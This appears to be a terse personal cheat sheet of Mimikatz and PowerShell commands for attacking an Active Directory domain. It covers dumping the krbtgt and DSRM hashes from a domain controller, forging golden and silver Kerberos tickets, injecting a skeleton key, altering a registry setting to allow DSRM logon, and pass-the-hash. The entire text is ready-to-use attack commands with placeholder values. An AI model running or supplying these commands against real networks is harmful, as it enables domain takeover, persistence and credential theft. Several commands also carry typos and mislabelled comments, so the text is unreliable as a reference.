#Golden Ticket - Persistence

#execute on dc by da to get krbtgt hash
Invoke-mimikatz -command '"lsadump::lsa /patch"' -cn dc01

#on any machine
invoke-mimikatz -command '"kerberos::golden /user:Administrator /domain:toyo.loc 
/sid:S-_5-21-333333-33333-3333333 /krbtgt:krbgt password hash id:500 /groups:512
/startoffset:0 /endin:600 /renewmax:10080 /ptt"'


#Silver ticker - service CIFS, HOST,RPCSS, WSMAND......
#execute on dc by da to get krbtgt hash
Invoke-mimikatz -command '"lsadump::lsa /patch"' -cn dc01

#using hash of DC computer account to access shares on DC
invoke-mimikatz -command '"kerberos::golden /domain:toyo.loc 
/sid:S-_5-21-333333-33333-3333333 /target:dc1/toyo.loc
/service:CIFS /rc4:DC Password hash /user:Administrator /ptt"'


#Skeleton key any user with same password
invoke-mimikatz -command '"privilege::debug" "misc::skeleton"' -cn dc01.toyo.loc

#dump DRSM Password - requries DA privs
Invok-mimikatz -command '"token::elevate" "lsadump::sam"' -cn dc01

#after extracting drsm set the following to allow local logon to dc with dsrm account
New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType dword -Force

#Pass the hash and elevate powershell
invoke-mimikatz -command '"sekurlas::pth /domain:dc01.toyo.loc /user:Administrator /ntlm:password hash /run:powershell.exe"'

